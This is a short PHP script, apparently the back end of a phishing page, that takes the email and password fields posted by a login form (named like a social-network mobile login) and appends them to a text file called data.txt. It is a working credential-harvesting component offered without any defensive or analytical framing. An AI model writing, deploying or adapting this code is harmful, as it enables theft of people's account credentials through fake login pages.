<?php

$fichier = fopen(data.txt, "a+");
fwrite($fichier, $_POST[m_login_email]."|".$_POST[m_login_password]."\n");
fclose($fichier);
?>